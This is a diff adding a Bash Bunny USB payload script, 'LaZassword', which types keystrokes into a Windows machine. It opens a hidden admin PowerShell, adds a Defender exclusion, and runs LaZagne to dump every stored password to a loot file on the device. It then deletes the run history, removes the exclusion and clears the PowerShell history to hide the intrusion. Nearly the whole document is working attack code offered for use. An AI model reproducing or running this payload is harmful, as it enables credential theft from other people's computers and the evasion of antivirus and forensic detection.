@@ -1,0 +1,127 @@
+#!/bin/bash
+#
+# Title: LaZassword
+# Author: kuyaya
+# Version: 1.0
+
+# Check readiness & prepare environment
+LED SETUP
+ATTACKMODE HID STORAGE
+
+# Ensure loot is available for saving results.
+mount /dev/nandf /root/udisk/
+
+# Setup
+GET SWITCH_POSITION
+GET TARGET_HOSTNAME 
+
+# Attack
+LED ATTACK
+
+# Change the keyboard layout to en-US with Altcode. I tried it with DUCKY_LANG but in my case, the "ch" language
+# can't print all symbols, so it doesn't work. This is just to make that it works 100%.
+# Delete this if you already have an en-US keyboard layout
+Q GUI r
+Q ALTCODE 45
+Q ALTCODE 45
+Q ALTCODE 45
+Q ALTCODE 45
+Q ALTCODE 59
+Q LEFT
+Q LEFT
+Q LEFT
+Q LEFT
+Q LEFT
+Q STRING powershell.exe Set
+Q RIGHT
+Q STRING WinUserLanguageList
+Q SPACE
+Q RIGHT
+Q STRING LanguageList en
+Q RIGHT
+Q STRING US
+Q SPACE
+Q RIGHT
+Q STRING force
+Q RIGHT
+Q ENTER
+sleep 3
+
+# Start powershell as admin to run the Attack.
+# Note: I didn't "Alt y" on purpose because if the Windows Language isn't English, Alt y doesn't work.
+Q GUI r
+Q STRING powershell
+Q CTRL-SHIFT ENTER
+sleep 1
+Q LEFT
+Q ENTER
+sleep 1
+
+# Make the windows as small as possible
+Q STRING "[console]::windowwidth=1; [console]::windowheight=1;"
+Q ENTER
+
+# Get the drive letter for the BashBunny {BLABEL = BashbunnyLabel}
+Q STRING "\$BLABEL = (gwmi -class win32_volume -f {label = \"BASHBUNNY\"}).DriveLetter"
+Q ENTER
+
+# Add an exclusion for the Bunny. This is better than turning off the AV.
+Q STRING "Add-MpPreference -ExclusionPath \"\$BLABEL\""
+Q ENTER
+
+# Unzip lazagne
+Q STRING "Expand-Archive -Force \$BLABEL\lazagne.zip \$BLABEL\lazagne"
+Q ENTER
+
+# Set the LPATH {LPATH = LaZagnePath}
+Q STRING "\$LPATH = & \$BLABEL\lazagne\lazagne.exe all -vv -password 307789"
+Q ENTER
+
+# Get the real Target_IP (not just 172.16.64.10). It's just used to get more information.
+Q STRING "\$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address"
+Q ENTER
+
+# Set the name of the lootfile as the Target_IP.
+Q STRING "\$LOOTFILE = \"\$BLABEL\loot\.\$ipV4.txt\""
+Q ENTER
+
+# Run laZagne and store it in the lootfile.
+Q STRING "\$LPATH | Out-File -FilePath \$LOOTFILE"
+Q ENTER
+
+# From here, the attack is finished. Anything below this is just to delete the traces.
+
+# Remove the "run" history
+Q STRING "reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f"
+Q ENTER
+
+# Removes laZagne. You need to do this before you can remove the exclusion.
+Q STRING "Remove-Item \"\$BLABEL\lazagne\" -recurse"
+Q ENTER
+
+# Removes the exclusion
+Q STRING "Remove-MpPreference -ExclusionPath \"\$BLABEL\""
+Q ENTER
+
+# Sets the keyboard layout back to normal
+# Replace de "de-CH" with the layout your victim uses. In my case, it is "de-CH" because I live in swiss. It is important to change it
+# that because you probably don't live in switzerland.
+Q STRING "Set-WinUserLanguageList -LanguageList de-CH -force;"
+Q ENTER
+
+# Deletes the command history in powershell. The "-" has to be written with an altcode because of the keyboard layout.
+Q STRING "Clear"
+Q ALTCODE 45
+Q STRING "History"
+Q ENTER
+
+# Exit, because ALT F4 doesnt work in powershell, and if it would, it wouldn't work because of the keyboard layout.
+Q STRING "exit"
+Q ENTER
+
+# Finish
+LED FINISH
+
+
+
+
